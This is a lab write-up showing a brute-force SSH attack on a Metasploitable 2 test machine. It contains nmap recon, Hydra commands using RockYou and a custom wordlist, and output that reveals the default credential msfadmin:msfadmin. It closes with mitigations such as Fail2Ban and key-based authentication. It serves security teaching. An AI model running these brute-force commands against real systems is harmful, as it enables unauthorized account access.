# Brute Force SSH Login Using Hydra

## Objective

Simulate a brute-force attack against an SSH service using Hydra to test password strength and understand the risks of weak or default credentials.

## Target Information

- **Target Machine:** Metasploitable 2
- **IP Address:** 192.168.56.102
- **Service:** SSH (Port 22)
- **Known User:** `msfadmin`

## Tools Used

- Kali Linux
- Hydra (pre-installed in Kali)
- RockYou password list: `/usr/share/wordlists/rockyou.txt`
- Nmap (for recon)
- Custom wordlist: `quicklist.txt`

## Lab 
### STEP 1

#### Ensure Metasploitable 2 is powered on and reachable from Kali

Confirm SSH is enabled on the target:

```bash
nmap -sS -sV -O 192.168.56.102
nmap -p 22 192.168.56.102
```
![image](https://github.com/user-attachments/assets/5f925245-1d15-41b4-b92c-2439563e5ed1)
Confirm that SSH is running and reachable (I did a little extra)

### STEP 2 

#### Enable SSH client compatibility in Kali (After SSH atttept failed)

#### Failed SSH attempt
```bash
──(kali㉿kali)-[/usr/share/wordlists]
└─$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt.gz  ssh://192.168.56.102

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-01 13:11:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.56.102:22/
[ERROR] could not connect to ssh://192.168.56.102:22 - kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]
```

#### Enable SSH Client

```bash
sudo kali-tweaks
```
Go to Hardening
![Screenshot 2025-07-01 134802](https://github.com/user-attachments/assets/63042173-8d77-438f-aa07-a7d134811899)


Toggle SSH Client
![Screenshot 2025-07-01 134826](https://github.com/user-attachments/assets/6494ba13-6efb-436c-8727-83577d01b8e5)
![Screenshot 2025-07-01 134815](https://github.com/user-attachments/assets/32e5b084-6d0a-4c21-b3d1-084391714d56)

This allows Hydra to connect to legacy SSH servers like Metasploitable 2

### STEP 3
#### Attempting RockYou (Too large)

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.gz ssh://192.168.56.102
```
#### Failed (Cancelled) due to large size

```bash
└─$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt.gz  ssh://192.168.56.102

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-01 13:34:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.56.102:22/
[STATUS] 216.00 tries/min, 216 tries in 00:01h, 14344191 to do in 1106:49h, 8 active
 [STATUS] 208.00 tries/min, 624 tries in 00:03h, 14343783 to do in 1149:21h, 8 active
```
#### Realized I needed to uncompress file

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

### STEP 4

#### Create a faster wordlist

```bash
echo -e "msfadmin\nadmin\npassword\n123456\nletmein\nkali" > quicklist.txt
```

### STEP 5
#### Run Hydra with optimization flags (Run Hydra with decompressed RockYou)

```bash
hydra -l msfadmin -P quicklist.txt ssh://192.168.56.102 -t 4 -V -f
```
#### Result

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l msfadmin -P quicklist.txt ssh://192.168.56.102 -t 4 -V -f

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-01 13:39:05
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task
[DATA] attacking ssh://192.168.56.102:22/
[ATTEMPT] target 192.168.56.102 - login "msfadmin" - pass "msfadmin" - 1 of 6 [child 0] (0/0)
[ATTEMPT] target 192.168.56.102 - login "msfadmin" - pass "admin" - 2 of 6 [child 1] (0/0)
[ATTEMPT] target 192.168.56.102 - login "msfadmin" - pass "password" - 3 of 6 [child 2] (0/0)
[ATTEMPT] target 192.168.56.102 - login "msfadmin" - pass "123456" - 4 of 6 [child 3] (0/0)
[22][ssh] host: 192.168.56.102   login: msfadmin   password: msfadmin
[STATUS] attack finished for 192.168.56.102 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-01 13:39:15
```
Success!

#### Run with uncompressed RockYou

```bash
└─$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 6   
```

#### Result (still too long)
```bash
└─$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 6       

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-01 14:04:24
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-I
[DATA] max 6 tasks per 1 server, overall 6 tasks, 14344399 login tries (l:1/p:14344399), ~2390734 tries per task
[DATA] attacking ssh://192.168.56.102:22/
[STATUS] 162.00 tries/min, 162 tries in 00:01h, 14344237 to do in 1475:45h, 6 active
```

## Analysis
- Brute-forcing with Hydra is effective when credentials are weak
- Custom wordlists reduce time, increase efficiency in lab settings
- rockyou.txt is too large for quick testing and isn’t practical here
- The target accepted a known default credential (msfadmin:msfadmin)

## Mititgation Recommedations
- Enforce strong passwords
- Disable default accounts or rename them
- Limit SSH access (IP whitelisting, firewall)
- Use tools like Fail2Ban to detect and block repeated login attempts
- Consider disabling password-based login in favor of key-based auth
